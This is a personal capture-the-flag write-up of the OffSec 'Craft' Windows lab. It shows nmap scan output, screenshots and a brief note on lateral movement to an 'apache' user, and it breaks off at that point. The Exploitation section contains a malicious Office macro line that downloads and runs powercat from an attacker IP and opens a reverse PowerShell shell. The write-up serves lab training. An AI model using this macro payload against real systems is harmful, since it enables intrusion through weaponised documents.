---
title: "Craft"
date: 2026-03-29
draft: false
description: "OffSec Craft writeup"
tags: ["windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Craft

## Overview

- **OS:** Windows
- **IP:** 192.168.222.169
- **Difficulty:** Hard
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Initial with macro doc, priesc with lateral movement for better privs.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-29 04:26 EDT
Nmap scan report for 192.168.222.169
Host is up (0.095s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   80.75 ms 192.168.45.1
2   80.72 ms 192.168.45.254
3   80.77 ms 192.168.251.1
4   81.05 ms 192.168.222.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.67 seconds

```

## Dirbusting

```

```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 915.png" >}}

{{< figure src="image 916.png" >}}

## Exploitation

lets follow this

[https://github.com/jotyGill/macro-generator](https://github.com/jotyGill/macro-generator)

{{< figure src="image 917.png" >}}

{{< figure src="image 918.png" >}}

{{< figure src="image 919.png" >}}

{{< figure src="image 920.png" >}}

Looks like its working so lets make it a revshell

{{< figure src="image 921.png" >}}

lets replace with this and run it

```
 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.154/powercat.ps1');powercat -c 192.168.45.154 -p 135 -e powershell")
```

{{< figure src="image 922.png" >}}

{{< figure src="image 923.png" >}}

we have write over this and we know that there is another user called apache lets laterally move

we have impersonate priv on this user

{{< figure src="image 924.png" >}}
